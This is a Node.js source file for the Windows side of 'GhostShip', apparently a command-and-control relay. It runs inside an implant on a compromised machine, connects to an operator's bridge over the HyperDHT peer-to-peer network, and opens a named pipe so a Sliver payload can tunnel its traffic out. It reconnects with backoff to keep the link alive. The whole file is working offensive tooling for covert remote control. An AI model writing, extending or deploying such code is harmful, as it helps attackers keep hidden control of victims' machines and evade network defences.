/*
 * GhostShip Implant-Side P2P Client (Windows)
 *
 * This script runs on the target Windows machine inside the implant.
 * It connects to the operator's bridge via HyperDHT and creates a
 * named pipe server for the Sliver payload to connect to.
 *
 * Usage: node client-windows.js <connection-key>
 *   connection-key: hs://<public-key-hex> from the operator's bridge
 *
 * Environment:
 *   GS_NAMED_PIPE: Named pipe path (default: \\.\pipe\gspipe)
 */

const net = require('net');
const HyperDHT = require('hyperdht');

/* Parse connection key from command line */
const connKey = process.argv[2];
if (!connKey || !connKey.startsWith('hs://')) {
    console.error('[!] Usage: node client-windows.js hs://<connection-key>');
    process.exit(1);
}

/* Extract public key hex from connection string */
const publicKeyHex = connKey.replace('hs://', '');
const publicKey = Buffer.from(publicKeyHex, 'hex');

if (publicKey.length !== 32) {
    console.error('[!] Invalid connection key length');
    process.exit(1);
}

/* Get named pipe path from environment or use default */
const pipePath = process.env.GS_NAMED_PIPE || '\\\\.\\pipe\\gspipe';

/* Initialize DHT */
const dht = new HyperDHT();

/* Track active connections */
let dhtSocket = null;
let pipeServer = null;

async function connectToBridge() {
    console.log('[*] GhostShip Client (Windows) Starting...');
    console.log(`[*] Connecting to: ${connKey.substring(0, 20)}...`);

    try {
        /* Connect to the bridge via DHT */
        dhtSocket = dht.connect(publicKey);

        dhtSocket.on('open', () => {
            console.log('[+] P2P Connection established');
            startPipeServer();
        });

        dhtSocket.on('error', (err) => {
            console.error('[!] DHT connection error:', err.message);
            scheduleReconnect();
        });

        dhtSocket.on('close', () => {
            console.log('[*] DHT connection closed');
            if (pipeServer) {
                pipeServer.close();
                pipeServer = null;
            }
            scheduleReconnect();
        });

    } catch (err) {
        console.error('[!] Connection failed:', err.message);
        scheduleReconnect();
    }
}

function startPipeServer() {
    console.log(`[*] Creating named pipe server: ${pipePath}`);

    pipeServer = net.createServer((pipeConn) => {
        console.log('[*] Sliver connected to named pipe');

        if (!dhtSocket || dhtSocket.destroyed) {
            console.error('[!] DHT socket not available');
            pipeConn.destroy();
            return;
        }

        /* Bidirectional pipe between DHT and named pipe */
        dhtSocket.pipe(pipeConn);
        pipeConn.pipe(dhtSocket);

        pipeConn.on('error', (err) => {
            console.error('[!] Pipe connection error:', err.message);
        });

        pipeConn.on('close', () => {
            console.log('[*] Pipe connection closed');
        });
    });

    pipeServer.listen(pipePath, () => {
        console.log(`[+] Named pipe server listening: ${pipePath}`);
    });

    pipeServer.on('error', (err) => {
        console.error('[!] Pipe server error:', err.message);
        /* On Windows, EADDRINUSE means pipe already exists */
        if (err.code === 'EADDRINUSE') {
            console.log('[*] Retrying pipe creation in 2s...');
            setTimeout(() => startPipeServer(), 2000);
        }
    });
}

/* Reconnection logic with exponential backoff */
let reconnectAttempts = 0;
const MAX_RECONNECT_DELAY = 300000; /* 5 minutes */

function scheduleReconnect() {
    reconnectAttempts++;
    const delay = Math.min(1000 * Math.pow(2, reconnectAttempts), MAX_RECONNECT_DELAY);
    console.log(`[*] Reconnecting in ${delay / 1000}s (attempt ${reconnectAttempts})`);
    setTimeout(connectToBridge, delay);
}

/* Handle process signals */
process.on('SIGTERM', () => {
    console.log('[*] Received SIGTERM, shutting down');
    cleanup();
});

process.on('SIGINT', () => {
    console.log('[*] Received SIGINT, shutting down');
    cleanup();
});

function cleanup() {
    if (pipeServer) {
        pipeServer.close();
    }
    if (dhtSocket) {
        dhtSocket.destroy();
    }
    dht.destroy();
    process.exit(0);
}

/* Start connection */
connectToBridge();
